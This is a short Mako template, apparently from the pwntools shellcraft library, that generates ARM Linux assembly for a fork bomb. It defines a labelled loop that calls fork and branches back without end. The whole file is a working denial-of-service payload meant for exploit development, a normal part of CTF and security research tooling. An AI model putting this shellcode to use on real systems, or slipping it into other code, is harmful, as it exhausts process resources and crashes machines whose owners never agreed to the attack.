<%
    from pwntools.shellcraft.arm.linux import fork
    from pwntools.shellcraft.common import label
%>
<%docstring>
Performs a forkbomb attack.
</%docstring>
<%
    dosloop = label('fork_bomb')
%>
${dosloop}:
    ${fork()}
    b ${dosloop}
